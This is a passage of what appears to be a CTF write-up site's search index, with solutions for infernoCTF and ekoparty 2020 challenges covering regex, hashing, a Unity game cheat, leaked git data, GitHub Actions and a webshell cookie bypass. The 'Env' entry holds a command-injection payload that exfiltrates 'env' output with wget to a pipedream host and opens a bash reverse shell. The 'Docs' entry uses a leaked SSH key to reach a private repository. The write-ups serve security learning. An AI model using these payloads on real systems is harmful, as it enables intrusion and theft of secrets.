(?&lt;!([a-u]|[w-z])(j|[a-h])).{2,64}"},{"location":"ctfs/infernoCTF/register_x/#4th-part-s255n2","text":"Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64}(?<!\\S){255}n.{2} Type: Negative look behind Matching string: infernoCTF{H+avixx nxx xx can be anything.","title":"4th part: (?&lt;!\\S){255}n.{2}"},{"location":"ctfs/infernoCTF/register_x/#5th-part-sg_funw","text":"Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64}(?<!\\S){255}n.{2}(?<=\\s)g_fUn\\W Type: Positive look behind Matching string: infernoCTF{H+avixx nx g_fUn! must be a space before g_fUn must end with a non-alphanumeric (/W)","title":"5th part: (?&lt;=\\s)g_fUn\\W"},{"location":"ctfs/infernoCTF/register_x/#6th-part-a-z","text":"Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64}(?<!\\S){255}n.{2}(?<=\\s)g_fUn\\W(?<=[A-z])} Type: Positive look behind Matching string: infernoCTF{H+avixx nx g_fUn^} [A-z] involves some non alphanumeric character such as: [ / ] ^ _ (check ascii table) At this point, just to make a little more sense, I changed, to spaces : infernoCTF{H+avi n g_fUn^}","title":"6th part: (?&lt;=[A-z])}"},{"location":"ctfs/infernoCTF/register_x/#7th-part-14","text":"Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64}(?<!\\S){255}n.{2}(?<=\\s)g_fUn\\W(?<=[A-z])}(?<=..{14}) Type: Positive look behind Matching string: infernoCTF{H+avi . n g_fUn^} Must be a point (14 chars before) and 14 chars.. We can add spaces in the part of {2,64}.","title":"7th part: (?&lt;=..{14})"},{"location":"ctfs/infernoCTF/register_x/#8th-part-33","text":"Total: infernoCTF{.(?<=H){21}. a-z {1024}[a-z] a-j .{2,64}(?<!\\S){255}n.{2}(?<=\\s)g_fUn\\W(?<=[A-z])}(?<=..{14})(?<=^.{33}) Type: Positive look behind Matching string: infernoCTF{H+avi . n g_fUn^} Total amount of chars should be 33. Remove some spaces.","title":"8th part: (?&lt;=^.{33})"},{"location":"ctfs/infernoCTF/register_x/#flag","text":"infernoCTF{H+avi . n g_fUn^}","title":"Flag"},{"location":"ctfs/infernoCTF/register_x/#kudos","text":"To @NicolasRaus who worked together with me to develop this one.","title":"Kudos"},{"location":"ctfs/main_ekoparty_2020/INF/","text":"Challenge Data Name : INF Category : Misc Points : 427/500 Description : A PHP code Solution The php code was: <?php $i = 0; $answer = ''; while (true) { $answer = md5($answer, true); if (bin2hex($answer) === '4f6dfbf954845988ff49f95b61c68005') echo \"EKO{$i}\"; } ?> Basically, the code is calculating the hash(hash(hash(hash(....(hash(\"\"))))))). The flag can be think as \"the number of times you need to apply hash recursively until you get the value '4f6dfbf954845988ff49f95b61c68005'. Trying to crack that hash, won't be helpful. We just need the number of times. TL;DR Just run the code in PHP, wait for a while. You'll get the answer. Ideas (which didn't work) When I first saw this challenge I thought it would be impossible to run it and find the answer (mental note for next similar challenge, run it anyways). (I think that the author of this challenge may have think that dumb people like me will think the same thing xD). So I started thinking about the different ideas. When you define a variable in PHP with: $variable = 0; The type of that variable is Integer. So I thought what would happen if you achieve the PHP_INT_MAX ? I developed a little PHP snippet which gave me a very interesting result: <?php $i = PHP_INT_MAX; echo \"MAX int: \" . $i.\" \" .gettype($i).\"<br>\"; $i++; echo \"MAX INT +1: \" . $i. \" \" .gettype($i).\"<br>\"; $iteration = 100000000; $j=$i + $iteration; while ($iteration!=0){ $iteration--; $i++; } echo \"Max Int + 1kk: \".$i. \" \" .gettype($i).\"<br>\"; echo \"Max Int + 1kk d1: \".$j.\" \" .gettype($i).\"<br>\"; The result of running this code is: Once the integer value achieves PHP_INT_MAX +1, it dinamically changes its type and get convered to a Double . However, as can be seen in the screenshot, the once the variable is a double the ++ doesn't increments its value again. This meant that if the value '4f6dfbf954845988ff49f95b61c68005' is achieved after PHP_INT_MAX times, the value of $i will be 9.22337203685E+18. I thought it was a solid idea, so I tried to use this as a flag. But it didn't work. Reason: The hash value was achieved before PHP_INT_MAX times. When we decided to run this code anyways, I developed a C script, but was worthless due to another teammate got the flag bofore just using the PHP :) . Anways, here is the code. I based my code on an answer of the thread of stackoverflow that I don't find now :( #include <stdio.h> #include <stdlib.h> #include <string.h> #if defined(__APPLE__) # define COMMON_DIGEST_FOR_OPENSSL # include <CommonCrypto/CommonDigest.h> # define SHA1 CC_SHA1 #else #include <openssl/md5.h> #endif char *str2md5(const char *str, int length) { int n; MD5_CTX c; unsigned char digest[16]; char *out = (char*)malloc(33); MD5_Init(&c); while (length > 0) { if (length > 512) { MD5_Update(&c, str, 512); } else { MD5_Update(&c, str, length); } length -= 512; str += 512; } MD5_Final(digest, &c); for (n = 0; n < 16; ++n) { snprintf(&(out[n*2]), 16*2, \"%02x\", (unsigned int)digest[n]); } return out; } int main(int argc, char **argv) { int j=0; char *output_mine = malloc(33); char* output; output = str2md5(\"\", strlen(\"\")); memcpy(output_mine, output, 32); free(output); while (1){ if (strcmp(output_mine,\"4f6dfbf954845988ff49f95b61c68005\") == 0){ printf(\"%s\\n\", output_mine); printf(\"%d\\n\",j); return 0; } output = str2md5(output_mine, strlen(output_mine)); memcpy(output_mine, output, 32); free(output); j = j + 1; } // return 0; }","title":"INF"},{"location":"ctfs/main_ekoparty_2020/INF/#challenge-data","text":"Name : INF Category : Misc Points : 427/500 Description : A PHP code","title":"Challenge Data"},{"location":"ctfs/main_ekoparty_2020/INF/#solution","text":"The php code was: <?php $i = 0; $answer = ''; while (true) { $answer = md5($answer, true); if (bin2hex($answer) === '4f6dfbf954845988ff49f95b61c68005') echo \"EKO{$i}\"; } ?> Basically, the code is calculating the hash(hash(hash(hash(....(hash(\"\"))))))). The flag can be think as \"the number of times you need to apply hash recursively until you get the value '4f6dfbf954845988ff49f95b61c68005'. Trying to crack that hash, won't be helpful. We just need the number of times.","title":"Solution"},{"location":"ctfs/main_ekoparty_2020/INF/#tldr","text":"Just run the code in PHP, wait for a while. You'll get the answer.","title":"TL;DR"},{"location":"ctfs/main_ekoparty_2020/INF/#ideas-which-didnt-work","text":"When I first saw this challenge I thought it would be impossible to run it and find the answer (mental note for next similar challenge, run it anyways). (I think that the author of this challenge may have think that dumb people like me will think the same thing xD). So I started thinking about the different ideas. When you define a variable in PHP with: $variable = 0; The type of that variable is Integer. So I thought what would happen if you achieve the PHP_INT_MAX ? I developed a little PHP snippet which gave me a very interesting result: <?php $i = PHP_INT_MAX; echo \"MAX int: \" . $i.\" \" .gettype($i).\"<br>\"; $i++; echo \"MAX INT +1: \" . $i. \" \" .gettype($i).\"<br>\"; $iteration = 100000000; $j=$i + $iteration; while ($iteration!=0){ $iteration--; $i++; } echo \"Max Int + 1kk: \".$i. \" \" .gettype($i).\"<br>\"; echo \"Max Int + 1kk d1: \".$j.\" \" .gettype($i).\"<br>\"; The result of running this code is: Once the integer value achieves PHP_INT_MAX +1, it dinamically changes its type and get convered to a Double . However, as can be seen in the screenshot, the once the variable is a double the ++ doesn't increments its value again. This meant that if the value '4f6dfbf954845988ff49f95b61c68005' is achieved after PHP_INT_MAX times, the value of $i will be 9.22337203685E+18. I thought it was a solid idea, so I tried to use this as a flag. But it didn't work. Reason: The hash value was achieved before PHP_INT_MAX times. When we decided to run this code anyways, I developed a C script, but was worthless due to another teammate got the flag bofore just using the PHP :) . Anways, here is the code. I based my code on an answer of the thread of stackoverflow that I don't find now :( #include <stdio.h> #include <stdlib.h> #include <string.h> #if defined(__APPLE__) # define COMMON_DIGEST_FOR_OPENSSL # include <CommonCrypto/CommonDigest.h> # define SHA1 CC_SHA1 #else #include <openssl/md5.h> #endif char *str2md5(const char *str, int length) { int n; MD5_CTX c; unsigned char digest[16]; char *out = (char*)malloc(33); MD5_Init(&c); while (length > 0) { if (length > 512) { MD5_Update(&c, str, 512); } else { MD5_Update(&c, str, length); } length -= 512; str += 512; } MD5_Final(digest, &c); for (n = 0; n < 16; ++n) { snprintf(&(out[n*2]), 16*2, \"%02x\", (unsigned int)digest[n]); } return out; } int main(int argc, char **argv) { int j=0; char *output_mine = malloc(33); char* output; output = str2md5(\"\", strlen(\"\")); memcpy(output_mine, output, 32); free(output); while (1){ if (strcmp(output_mine,\"4f6dfbf954845988ff49f95b61c68005\") == 0){ printf(\"%s\\n\", output_mine); printf(\"%d\\n\",j); return 0; } output = str2md5(output_mine, strlen(output_mine)); memcpy(output_mine, output, 32); free(output); j = j + 1; } // return 0; }","title":"Ideas (which didn't work)"},{"location":"ctfs/main_ekoparty_2020/cheater/","text":"Challenge Data Name : Cheater Category : Misc Points : 442/500 Worked together with : @ls_cabrera , @sebarodriguez Description : \"It's time to dust off your gaming skills, or maybe your reversing skills? This is not an easy one, good luck trying to get a MILLION points\" Solution The challenge was a link to a server hosting a game. By going to the webpage of the game an analyzing its traffic we realised that it was asking for 3 different and interesting resources: The files where: * BuildV4.wasm.framework.unityweb * BuildV4.wasm.code.unityweb * BuildV4.data.unityweb At the same time, by using the tool AssetStudioGUI , we found the data objects of the game: We started analyzing the downloaded files to see if we could get some useful information from there. We were able to list some objects/methods that were implemented, just by reading (in raw) the BuildV4.data.unityweb file: ^@p3^@Bezier3^@BezierTangent3^@Bezier1^@BezierTangent1^@knot^@ctrl1^@ctrl2^@ComputeSmoothControlPoints^@ComputeSmoothControlPointsLooped^@UnityVectorExtensions^@s0^@ClosestPointOnSegment^@ProjectOntoPlane^@AlmostZero^@SafeFromToRotation^@vA^@vB^@SlerpWithReferenceUp^@UnityQuaternionExtensions^@qA^@qB^@orient^@lookAtDir^@GetCameraRotationToTarget^@ApplyCameraRotation^@UnityRectExtensions^@Inflated^@78517443912BB49729313EC23065D9970ABC80E3^@Assembly-CSharp^@Assembly-CSharp.dll^@GameManager^@get_CurrentScore^@set_CurrentScore^@sceneIndex^@CleanMemory^@CleanResources^@UpdateScore^@player^@GameOver^@playButton^@finalScoreText^@currentScoreText^@_scoreManager^@txtUno^@txtDos^@m_Singleton^@m_CurrentScore^@backup^@CurrentScore^@ScenesNames^@START_MENU^@PLAY_SCENE^@GAME_OVER^@ParallaxEffect^@mainCamera^@parallaxEffectSpeed^@lengthSprite^@PlayerController^@IsInGround^@AddPoints^@platformLayerMask^@jumpForce^@moveSpeed^@motionX^@jump^@_rigidbody^@_circleCollider^@velocityZero^@_gameManager^@ScoreManager^@EnableScoreText^@DisableScoreText^@SetScoreText^@m_textMeshpro^@SpawnPlatforms^@CreateBlock^@blocks^@spaw As you can see from there, ScoreManager was part of the list. Next to it had some itneresting names like DisableScoreText , SetScoreText , etc. These names sounded like method names, so our next test was try them. We opened a JS console of the game and tried these methods: Although it seemed to work, it really didn't : We could see that the score changed, but it wasn't taking actually working. So we thought that we maybe were dealing with the incorrect object. Going back to the AssetStudioGUI , we realised there was another interesting object: GameController . Looking for this object in the previous image (with all the methods) we found that there was a GameManager which was close to a, most probably, method called UpdateScore . So we tried that: This time, the score seemed to be really updated. We went for the 1kk: and.. For sure there should be a neat solution for this... but it worked :)","title":"Cheater"},{"location":"ctfs/main_ekoparty_2020/cheater/#challenge-data","text":"Name : Cheater Category : Misc Points : 442/500 Worked together with : @ls_cabrera , @sebarodriguez Description : \"It's time to dust off your gaming skills, or maybe your reversing skills? This is not an easy one, good luck trying to get a MILLION points\"","title":"Challenge Data"},{"location":"ctfs/main_ekoparty_2020/cheater/#solution","text":"The challenge was a link to a server hosting a game. By going to the webpage of the game an analyzing its traffic we realised that it was asking for 3 different and interesting resources: The files where: * BuildV4.wasm.framework.unityweb * BuildV4.wasm.code.unityweb * BuildV4.data.unityweb At the same time, by using the tool AssetStudioGUI , we found the data objects of the game: We started analyzing the downloaded files to see if we could get some useful information from there. We were able to list some objects/methods that were implemented, just by reading (in raw) the BuildV4.data.unityweb file: ^@p3^@Bezier3^@BezierTangent3^@Bezier1^@BezierTangent1^@knot^@ctrl1^@ctrl2^@ComputeSmoothControlPoints^@ComputeSmoothControlPointsLooped^@UnityVectorExtensions^@s0^@ClosestPointOnSegment^@ProjectOntoPlane^@AlmostZero^@SafeFromToRotation^@vA^@vB^@SlerpWithReferenceUp^@UnityQuaternionExtensions^@qA^@qB^@orient^@lookAtDir^@GetCameraRotationToTarget^@ApplyCameraRotation^@UnityRectExtensions^@Inflated^@78517443912BB49729313EC23065D9970ABC80E3^@Assembly-CSharp^@Assembly-CSharp.dll^@GameManager^@get_CurrentScore^@set_CurrentScore^@sceneIndex^@CleanMemory^@CleanResources^@UpdateScore^@player^@GameOver^@playButton^@finalScoreText^@currentScoreText^@_scoreManager^@txtUno^@txtDos^@m_Singleton^@m_CurrentScore^@backup^@CurrentScore^@ScenesNames^@START_MENU^@PLAY_SCENE^@GAME_OVER^@ParallaxEffect^@mainCamera^@parallaxEffectSpeed^@lengthSprite^@PlayerController^@IsInGround^@AddPoints^@platformLayerMask^@jumpForce^@moveSpeed^@motionX^@jump^@_rigidbody^@_circleCollider^@velocityZero^@_gameManager^@ScoreManager^@EnableScoreText^@DisableScoreText^@SetScoreText^@m_textMeshpro^@SpawnPlatforms^@CreateBlock^@blocks^@spaw As you can see from there, ScoreManager was part of the list. Next to it had some itneresting names like DisableScoreText , SetScoreText , etc. These names sounded like method names, so our next test was try them. We opened a JS console of the game and tried these methods: Although it seemed to work, it really didn't : We could see that the score changed, but it wasn't taking actually working. So we thought that we maybe were dealing with the incorrect object. Going back to the AssetStudioGUI , we realised there was another interesting object: GameController . Looking for this object in the previous image (with all the methods) we found that there was a GameManager which was close to a, most probably, method called UpdateScore . So we tried that: This time, the score seemed to be really updated. We went for the 1kk: and.. For sure there should be a neat solution for this... but it worked :)","title":"Solution"},{"location":"ctfs/main_ekoparty_2020/docs/","text":"Challenge Data Name : Docs Category : Git Points : 420/500 Solution (continuation of challenge LEAK) Unfortunately, by the time I\u2019m writing this writeup, both repositories involved were not longer available. We still had the private SSH key to be used. Besides that, inside the directory I found a hidden folder called .github . After searching for a while I found that this is related with Github Actions . Inside this folder there were two files: A config file (.yaml) and a Python file. After reading the documentation, the names of both files (issue-bouncer.(yaml|py)) and the content of these files I undertood that the Python script was being executed each time a new issue was created in the repository. The config file had some key thing to understand what was happening. name: Bounce issues from public repo to private repo [..] env: [..] DST_REPO: 'ekoparty2020/ekoparty-internal' DST_REPO_TOKEN: ${{ secrets.INTERNAL_TOKEN }} run: [..] python3 .github/workflows/issue-bouncer.py The Python script had the following interesting lines: # pull our repo access src_repo = Github(getenv('SRC_REPO_TOKEN')).get_repo(getenv('GITHUB_REPOSITORY')) dst_repo = Github(getenv('DST_REPO_TOKEN')).get_repo(getenv('DST_REPO')) # bounce to ekoparty-internal # pull the src issue src_issue_id = int(getenv('SRC_REPO_ISSUE')) src_issue = src_repo.get_issue(src_issue_id) # bounce a comment back to the src issue src_issue.create_comment('Thank you for submitting a staff report! This issue will be filed to the internal ekoparty2020 staff repo and triaged ASAP!') # bounce the issue through to the internal repo dst_repo.create_issue(title=src_issue.title, body=src_issue.body, labels=[dst_repo.get_label('Staff Report')]) # update the source issue title and make contents private src_issue.edit(title=\"This issue has been filed with staff internal repo! Thanks!\", body='', state='closed') As can be infered from both files, each time a new issue in the ekolabs appeared, it was automatically bounced to another (private) repo called ekoparty-internal . From the YAML file we can understand that the token in order to access that private repo is something readable only for the server that is running. So we couldn't clone that repo. But, we had a private SSH key that we didn't use yet. So I tried to download that repo using the private key. $> ssh-agent bash -c 'ssh-add id_rsa; git clone git@github.com:ekoparty2020/ekoparty-internal.git and it worked!! The repo had a README, cotaining the flag: # EkoParty 2020 issue tracker This is the internal ekoparty issue tracker for the 2020 edition. Please file any conference issues here for staff triage. Note: this repository uses github actions: https://docs.github.com/en/actions Also, congrats for solving Stage 2! EKO{1ca688c86b0548d8f26675d85dd77d73c573ebb6}","title":"Docs"},{"location":"ctfs/main_ekoparty_2020/docs/#challenge-data","text":"Name : Docs Category : Git Points : 420/500","title":"Challenge Data"},{"location":"ctfs/main_ekoparty_2020/docs/#solution","text":"(continuation of challenge LEAK) Unfortunately, by the time I\u2019m writing this writeup, both repositories involved were not longer available. We still had the private SSH key to be used. Besides that, inside the directory I found a hidden folder called .github . After searching for a while I found that this is related with Github Actions . Inside this folder there were two files: A config file (.yaml) and a Python file. After reading the documentation, the names of both files (issue-bouncer.(yaml|py)) and the content of these files I undertood that the Python script was being executed each time a new issue was created in the repository. The config file had some key thing to understand what was happening. name: Bounce issues from public repo to private repo [..] env: [..] DST_REPO: 'ekoparty2020/ekoparty-internal' DST_REPO_TOKEN: ${{ secrets.INTERNAL_TOKEN }} run: [..] python3 .github/workflows/issue-bouncer.py The Python script had the following interesting lines: # pull our repo access src_repo = Github(getenv('SRC_REPO_TOKEN')).get_repo(getenv('GITHUB_REPOSITORY')) dst_repo = Github(getenv('DST_REPO_TOKEN')).get_repo(getenv('DST_REPO')) # bounce to ekoparty-internal # pull the src issue src_issue_id = int(getenv('SRC_REPO_ISSUE')) src_issue = src_repo.get_issue(src_issue_id) # bounce a comment back to the src issue src_issue.create_comment('Thank you for submitting a staff report! This issue will be filed to the internal ekoparty2020 staff repo and triaged ASAP!') # bounce the issue through to the internal repo dst_repo.create_issue(title=src_issue.title, body=src_issue.body, labels=[dst_repo.get_label('Staff Report')]) # update the source issue title and make contents private src_issue.edit(title=\"This issue has been filed with staff internal repo! Thanks!\", body='', state='closed') As can be infered from both files, each time a new issue in the ekolabs appeared, it was automatically bounced to another (private) repo called ekoparty-internal . From the YAML file we can understand that the token in order to access that private repo is something readable only for the server that is running. So we couldn't clone that repo. But, we had a private SSH key that we didn't use yet. So I tried to download that repo using the private key. $> ssh-agent bash -c 'ssh-add id_rsa; git clone git@github.com:ekoparty2020/ekoparty-internal.git and it worked!! The repo had a README, cotaining the flag: # EkoParty 2020 issue tracker This is the internal ekoparty issue tracker for the 2020 edition. Please file any conference issues here for staff triage. Note: this repository uses github actions: https://docs.github.com/en/actions Also, congrats for solving Stage 2! EKO{1ca688c86b0548d8f26675d85dd77d73c573ebb6}","title":"Solution"},{"location":"ctfs/main_ekoparty_2020/env/","text":"Challenge Data Name : Env Category : Git Points : 443/500 Solution (continuation of challenge DOCS) Unfortunately, by the time I\u2019m writing this writeup, both repositories were not longer available. We had a new repository to inspect. I tried first to inspect the different commits but there was only one. Again, the directory .github with some workflows on it was present. This time the files were named issue-notify.(yaml|py) . The .yaml file had nothing interesting, but the Python script did: def issue_notify(title, body, repo): # just echo the body into the report repo at /tmp and our scraper script will pick them up and mail them out to staff@ notify_id = str(uuid.uuid4()) # only notify on very important issues to reduce spam! if 'very important' in title: os.system('echo \"%s\" > /tmp/%s' % (body, notify_id)) return def run(): issue_notify(getenv('ISSUE_TITLE'), getenv('ISSUE_BODY'), Github(getenv('REPORT_TOKEN'))) return Each time a new issue (bounced from the public repo) arrived, the run() function was executed. As you can see there is clear Code Injection in the issue_notify function. The command executed inside os.sytem takes into account body variable which is filled with the content of the body of the issue submitted. Furthermore, in order to exceute that line, the tilte of the issue should be the string \"very important\". I went to http:/github.com/ekoparty2020/ekolabs and started submitting issues with: * Title : very important * Body : asd\" ; #COMMAND_TO_EXECUTE; echo \"asd I used Pipedream in order to check if was receiving any kind of connection from the server. These were my attempts: Ensure it was working: body --> asd\" ; wget https://b9d850e1b49fcdfa12f3c7eb20d3c3e8.m.pipedream.net; echo \"asd The GET arrived!! Execute an 'ls' body --> asd\"; wget -X POST https://b9d850e1b49fcdfa12f3c7eb20d3c3e8.m.pipedream.net --post-data=`echo \\`ls\\` | base64`; echo \"asd The Data arrived! But the information wasn't useful Execute an \"env\" Because of the name of the challenge, I thought that the flag could be inside the environmental variables. body --> asd\"; wget -X POST https://b9d850e1b49fcdfa12f3c7eb20d3c3e8.m.pipedream.net --post-data=`echo \\`env\\` | base64`; echo \"asd The data arrived but was just one value. I didn't realise at this point what was happening (I'll come back later to this). Execute a rev shell body --> asd\"; bash -c \"/bin/bash -i >& /dev/tcp/<host>/56894 0>&1\"; echo \"asd This worked. Once inside just executed the 'env' command and the flag was there! I didn't want to execute a reverse shell because I was sure that the env command should've worked. Later I realized, that it didn't work beacuse the output was multiline. Most probably, If I should've issued use a tr -d '\\n' before encoding it to base64, it could've worked.","title":"Env"},{"location":"ctfs/main_ekoparty_2020/env/#challenge-data","text":"Name : Env Category : Git Points : 443/500","title":"Challenge Data"},{"location":"ctfs/main_ekoparty_2020/env/#solution","text":"(continuation of challenge DOCS) Unfortunately, by the time I\u2019m writing this writeup, both repositories were not longer available. We had a new repository to inspect. I tried first to inspect the different commits but there was only one. Again, the directory .github with some workflows on it was present. This time the files were named issue-notify.(yaml|py) . The .yaml file had nothing interesting, but the Python script did: def issue_notify(title, body, repo): # just echo the body into the report repo at /tmp and our scraper script will pick them up and mail them out to staff@ notify_id = str(uuid.uuid4()) # only notify on very important issues to reduce spam! if 'very important' in title: os.system('echo \"%s\" > /tmp/%s' % (body, notify_id)) return def run(): issue_notify(getenv('ISSUE_TITLE'), getenv('ISSUE_BODY'), Github(getenv('REPORT_TOKEN'))) return Each time a new issue (bounced from the public repo) arrived, the run() function was executed. As you can see there is clear Code Injection in the issue_notify function. The command executed inside os.sytem takes into account body variable which is filled with the content of the body of the issue submitted. Furthermore, in order to exceute that line, the tilte of the issue should be the string \"very important\". I went to http:/github.com/ekoparty2020/ekolabs and started submitting issues with: * Title : very important * Body : asd\" ; #COMMAND_TO_EXECUTE; echo \"asd I used Pipedream in order to check if was receiving any kind of connection from the server. These were my attempts: Ensure it was working: body --> asd\" ; wget https://b9d850e1b49fcdfa12f3c7eb20d3c3e8.m.pipedream.net; echo \"asd The GET arrived!! Execute an 'ls' body --> asd\"; wget -X POST https://b9d850e1b49fcdfa12f3c7eb20d3c3e8.m.pipedream.net --post-data=`echo \\`ls\\` | base64`; echo \"asd The Data arrived! But the information wasn't useful Execute an \"env\" Because of the name of the challenge, I thought that the flag could be inside the environmental variables. body --> asd\"; wget -X POST https://b9d850e1b49fcdfa12f3c7eb20d3c3e8.m.pipedream.net --post-data=`echo \\`env\\` | base64`; echo \"asd The data arrived but was just one value. I didn't realise at this point what was happening (I'll come back later to this). Execute a rev shell body --> asd\"; bash -c \"/bin/bash -i >& /dev/tcp/<host>/56894 0>&1\"; echo \"asd This worked. Once inside just executed the 'env' command and the flag was there! I didn't want to execute a reverse shell because I was sure that the env command should've worked. Later I realized, that it didn't work beacuse the output was multiline. Most probably, If I should've issued use a tr -d '\\n' before encoding it to base64, it could've worked.","title":"Solution"},{"location":"ctfs/main_ekoparty_2020/faraday/","text":"Challenge Data Name : Faraday Category : Sponsors Points : 440/500 Worked together with : @sebarodriguez Solution Unfortunately, this writeup will not have too much info due to the server went down before I could start writing this ! @seba found that in the HTML code of the response, there was a comment saying something like at /dump I store by bakcup code We went to /dump and succefully downloaded the source code of the APP that was running in the werbserver.","title":"Challenge Data"},{"location":"ctfs/main_ekoparty_2020/faraday/#challenge-data","text":"Name : Faraday Category : Sponsors Points : 440/500 Worked together with : @sebarodriguez","title":"Challenge Data"},{"location":"ctfs/main_ekoparty_2020/faraday/#solution","text":"Unfortunately, this writeup will not have too much info due to the server went down before I could start writing this ! @seba found that in the HTML code of the response, there was a comment saying something like at /dump I store by bakcup code We went to /dump and succefully downloaded the source code of the APP that was running in the werbserver.","title":"Solution"},{"location":"ctfs/main_ekoparty_2020/head/","text":"Challenge Data Name : Head Category : Git Points : 438/500 Worked together with : @jaccinelli Description : A common mistake on websites deployments. My webshell Solution Once you entered to http://head.ctf.cap.tf:30000 you find a screen with a blank space which seems to be a password placeholder. We used burp to understand what was going on. Only one variable, part of a POST, was being sent. We started playing with that parameter and due to we were dealing with PHP we tried to use an array: The answer was interesting. The underlaying PHP was calculating the MD5 of our param. Which sounded reasonable as we were dealing with a password. We continue trying to dig more about this service. By analyzing the description of the challenge again and also because it was in the git category, we decided to test accessing /.git dir. Unfortunately, a 404 HTTP error was retrieved. Then we tried with dirbuster but wasn't useful at all. Finally, using also the name of the challenge, we decided to test /.git/HEAD: Cool! The .git directory was being leaked! We started inspecting the different files of the directory manually, until we thougth that was better to download every file from it. We found this awesome tool called gitdumper . We executed it and after a couple of second, we had all the content inside our machines. The first file that we found was the index.php . The first lines of it were: <?php /* b374k shell 3.2.3 Jayalah Indonesiaku (c)2020 https://github.com/b374k/b374k */ $GLOBALS['pass'] = file_get_contents('../secret'); // sha1(md5(pass)) [..] It was defining the global parameter called pass with some fixed value from a file that wasn't readeable for us. After that line there were some strange lines. By inspecting the comments (at the top of the file) and some previous commits, we realized that this index.php was hosting a Web Shell called b374k . It was encoded so it wasn't easy to read it. We then inspected older commits and found that in the first version of this repo, the value of ../secret was hardcoded: However, this was the SHA1 of the MD5 of the real password. Nevertheless, we tried to use it as the password on the http://head.ctf.cap.tf:30000 screen, but it didn't work. In this same commit we found the webshell (shell.php) totally decoded, so we could perform a more straightforward analysis of it. By doing this analysis and a careful eye of @jaccinelli, we finally found the function that was performing the authorization check: if(!function_exists('auth')){ function auth(){ if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass'])!='')){ $c = $_COOKIE; $p = $_POST; if(isset($p['pass'])){ $your_pass = sha1(md5($p['pass'])); if($your_pass==$GLOBALS['pass']){ setcookie(\"pass\", $your_pass, time()+36000, \"/\"); header(\"Location: \".get_self()); } } if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){ $res = \"<!doctype html> [..] die(); Seems that there are two ways of authentication. If we could successfully meet one of those conditions we\u2019d be able to log in. 1. Using the correct pass. We only had the sha1 of the md5 of the correct pass, so it was impossible to retrieve it from there. 2. The second one was comparing the value of a cookie called pass against the value of $GLOBALS['pass']. But the value of global pass, as we saw before, was the hash of the hash of final password (the value that we already had). So it was enough to set a new cookie call pass with the value 134413ad5fa6b459b14ac999dc5f45f5f2647d19 and we successfully logged in.","title":"Head"},{"location":"ctfs/main_ekoparty_2020/head/#challenge-data","text":"Name : Head Category : Git Points : 438/500 Worked together with : @jaccinelli Description : A common mistake on websites deployments. My webshell","title":"Challenge Data"},{"location":"ctfs/main_ekoparty_2020/head/#solution","text":"Once you entered to http://head.ctf.cap.tf:30000 you find a screen with a blank space which seems to be a password placeholder. We used burp to understand what was going on. Only one variable, part of a POST, was being sent. We started playing with that parameter and due to we were dealing with PHP we tried to use an array: The answer was interesting. The underlaying PHP was calculating the MD5 of our param. Which sounded reasonable as we were dealing with a password. We continue trying to dig more about this service. By analyzing the description of the challenge again and also because it was in the git category, we decided to test accessing /.git dir. Unfortunately, a 404 HTTP error was retrieved. Then we tried with dirbuster but wasn't useful at all. Finally, using also the name of the challenge, we decided to test /.git/HEAD: Cool! The .git directory was being leaked! We started inspecting the different files of the directory manually, until we thougth that was better to download every file from it. We found this awesome tool called gitdumper . We executed it and after a couple of second, we had all the content inside our machines. The first file that we found was the index.php . The first lines of it were: <?php /* b374k shell 3.2.3 Jayalah Indonesiaku (c)2020 https://github.com/b374k/b374k */ $GLOBALS['pass'] = file_get_contents('../secret'); // sha1(md5(pass)) [..] It was defining the global parameter called pass with some fixed value from a file that wasn't readeable for us. After that line there were some strange lines. By inspecting the comments (at the top of the file) and some previous commits, we realized that this index.php was hosting a Web Shell called b374k . It was encoded so it wasn't easy to read it. We then inspected older commits and found that in the first version of this repo, the value of ../secret was hardcoded: However, this was the SHA1 of the MD5 of the real password. Nevertheless, we tried to use it as the password on the http://head.ctf.cap.tf:30000 screen, but it didn't work. In this same commit we found the webshell (shell.php) totally decoded, so we could perform a more straightforward analysis of it. By doing this analysis and a careful eye of @jaccinelli, we finally found the function that was performing the authorization check: if(!function_exists('auth')){ function auth(){ if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass'])!='')){ $c = $_COOKIE; $p = $_POST; if(isset($p['pass'])){ $your_pass = sha1(md5($p['pass'])); if($your_pass==$GLOBALS['pass']){ setcookie(\"pass\", $your_pass, time()+36000, \"/\"); header(\"Location: \".get_self()); } } if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){ $res = \"<!doctype html> [..] die(); Seems that there are two ways of authentication. If we could successfully meet one of those conditions we\u2019d be able to log in. 1. Using the correct pass. We only had the sha1 of the md5 of the correct pass, so it was impossible to retrieve it from there. 2. The second one was comparing the value of a cookie called pass against the value of $GLOBALS['pass']. But the value of global pass, as we saw before, was the hash of the hash of final password (the value that we already had). So it was enough to set a new cookie call pass with the value 134413ad5fa6b459b14ac999dc5f45f5f2647d19 and we successfully logged in.","title":"Solution"},{"location":"ctfs/main_ekoparty_2020/leak/","text":"Challenge Data Name : Leak Category : Git Points : 317/500 Solution Unfortunately, by the time I\u2019m writing this writeup, both repositories were not longer available. The challenge started by pointing you out to a repository . After doing a clone I began to analyze the repo. I started the anlysis by inspecting the commits and its messages, by executing a git log : The message of commit c21... seemed to be interesting so I executed a diff against the previous one: $>git diff fd5c9927bb9f5ee3e4c521def43d3033ae83b825 c21dbf5185a4dbdb5b2bd2f3d1d3b266c3a2271e The answer was: Nice! Seemes that a ssh private key was removed. I tried to recover it: $> git checkout fd5c9927bb9f5ee3e4c521def43d3033ae83b825 $> cd .ssh/ $> head -n 3 id_rsa $> cat id_rsa.pub That public key had something weird. Usually the last part of it is just a reference (optional) to the user@host where the private key lives. However, that host seemed weird. In fact, seems to be base64 encoded. $> echo RUtPezc0NGFkN2ZlOGU2Y2U1ZTg4NWFkMjRlZWYyNDNiMWZkMTFkMGZiN2V9 | base64 -d EKO{744ad7fe8e6ce5e885ad24eef243b1fd11d0fb7e}","title":"Leak"},{"location":"ctfs/main_ekoparty_2020/leak/#challenge-data","text":"Name : Leak Category : Git Points : 317/500","title":"Challenge 